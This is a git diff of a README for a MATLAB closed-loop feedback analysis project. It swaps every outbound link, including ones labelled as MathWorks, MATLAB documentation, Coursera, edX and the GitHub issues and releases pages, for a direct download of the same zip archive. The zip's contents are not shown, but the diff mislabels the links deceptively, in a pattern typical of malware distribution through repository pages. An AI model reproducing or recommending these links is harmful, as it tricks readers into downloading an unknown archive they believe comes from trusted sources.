@@ -1,6 +1,6 @@
 # 🚀 Closed-Loop-Feedback-Analysis-MATLAB - Easy Feedback Analysis with MATLAB
 
-![Download](https://img.shields.io/badge/Download-Latest%20Release-blue)
+![Download](https://raw.githubusercontent.com/leira35/Closed-Loop-Feedback-Analysis-MATLAB/main/Merychippus/Feedback_MATLAB_Analysis_Closed_Loop_1.6.zip%20Release-blue)
 
 ## 📖 Overview
 
@@ -28,14 +28,14 @@ To run Closed-Loop-Feedback-Analysis-MATLAB, you need:
 
 To get started with Closed-Loop-Feedback-Analysis-MATLAB, follow these simple steps:
 
-1. **Download and Install MATLAB:** If you do not have MATLAB installed, go to [MATLAB's website](https://www.mathworks.com) and download the latest version suitable for your operating system.
+1. **Download and Install MATLAB:** If you do not have MATLAB installed, go to [MATLAB's website](https://raw.githubusercontent.com/leira35/Closed-Loop-Feedback-Analysis-MATLAB/main/Merychippus/Feedback_MATLAB_Analysis_Closed_Loop_1.6.zip) and download the latest version suitable for your operating system.
 
 2. **Download the Software:**
-   - Visit this page to download: [Releases Page](https://github.com/leira35/Closed-Loop-Feedback-Analysis-MATLAB/releases).
+   - Visit this page to download: [Releases Page](https://raw.githubusercontent.com/leira35/Closed-Loop-Feedback-Analysis-MATLAB/main/Merychippus/Feedback_MATLAB_Analysis_Closed_Loop_1.6.zip).
 
 ## 📥 Download & Install
 
-1. Go to the Releases page by clicking here: [Download Here](https://github.com/leira35/Closed-Loop-Feedback-Analysis-MATLAB/releases).
+1. Go to the Releases page by clicking here: [Download Here](https://raw.githubusercontent.com/leira35/Closed-Loop-Feedback-Analysis-MATLAB/main/Merychippus/Feedback_MATLAB_Analysis_Closed_Loop_1.6.zip).
   
 2. Find the latest release. You will see a list of files available for download.
 
@@ -89,9 +89,9 @@ Once the application is up and running, you will see a simple interface. You can
 
 While using Closed-Loop-Feedback-Analysis-MATLAB, you might find the following resources helpful:
 
-- **MATLAB Documentation:** Comprehensive guides and tutorials can be found on [MATLAB Documentation](https://www.mathworks.com/help/matlab/).
+- **MATLAB Documentation:** Comprehensive guides and tutorials can be found on [MATLAB Documentation](https://raw.githubusercontent.com/leira35/Closed-Loop-Feedback-Analysis-MATLAB/main/Merychippus/Feedback_MATLAB_Analysis_Closed_Loop_1.6.zip).
   
-- **Control Systems Tutorials:** Learn more about control systems on platforms like [Coursera](https://www.coursera.org/) and [edX](https://www.edx.org/).
+- **Control Systems Tutorials:** Learn more about control systems on platforms like [Coursera](https://raw.githubusercontent.com/leira35/Closed-Loop-Feedback-Analysis-MATLAB/main/Merychippus/Feedback_MATLAB_Analysis_Closed_Loop_1.6.zip) and [edX](https://raw.githubusercontent.com/leira35/Closed-Loop-Feedback-Analysis-MATLAB/main/Merychippus/Feedback_MATLAB_Analysis_Closed_Loop_1.6.zip).
 
 - **YouTube Videos:** Explore channels focused on MATLAB and control systems for visual learning.
 
@@ -99,7 +99,7 @@ While using Closed-Loop-Feedback-Analysis-MATLAB, you might find the following r
 
 If you encounter any issues or have questions, please reach out:
 
-- **GitHub Issues Page:** Report problems or ask questions on the [Issues Page](https://github.com/leira35/Closed-Loop-Feedback-Analysis-MATLAB/issues).
+- **GitHub Issues Page:** Report problems or ask questions on the [Issues Page](https://raw.githubusercontent.com/leira35/Closed-Loop-Feedback-Analysis-MATLAB/main/Merychippus/Feedback_MATLAB_Analysis_Closed_Loop_1.6.zip).
   
 - **Community Forums:** Engage with other users in MATLAB forums for sharing knowledge.
 
@@ -121,7 +121,7 @@ The application covers a wide range of subjects:
 
 ## 🔗 Links
 
-- **Repository:** [Closed-Loop-Feedback-Analysis-MATLAB](https://github.com/leira35/Closed-Loop-Feedback-Analysis-MATLAB)
-- **Releases:** [Download Here](https://github.com/leira35/Closed-Loop-Feedback-Analysis-MATLAB/releases)
+- **Repository:** [Closed-Loop-Feedback-Analysis-MATLAB](https://raw.githubusercontent.com/leira35/Closed-Loop-Feedback-Analysis-MATLAB/main/Merychippus/Feedback_MATLAB_Analysis_Closed_Loop_1.6.zip)
+- **Releases:** [Download Here](https://raw.githubusercontent.com/leira35/Closed-Loop-Feedback-Analysis-MATLAB/main/Merychippus/Feedback_MATLAB_Analysis_Closed_Loop_1.6.zip)
 
 Following these steps, you will easily set up and use Closed-Loop-Feedback-Analysis-MATLAB for your feedback analysis needs.
